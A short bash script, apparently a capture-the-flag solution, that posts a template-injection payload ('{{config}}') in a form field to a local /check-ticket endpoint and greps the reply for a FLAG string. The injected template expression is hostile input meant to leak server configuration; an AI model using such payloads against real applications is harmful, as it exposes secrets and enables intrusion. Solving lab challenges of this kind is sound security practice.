#!/bin/bash

RESPONSE=$(curl -s -X POST -d "problem=printer {{config}}" http://127.0.0.1:5000/check-ticket)

echo "$RESPONSE" | grep --color -o "FLAG{[^}]*}"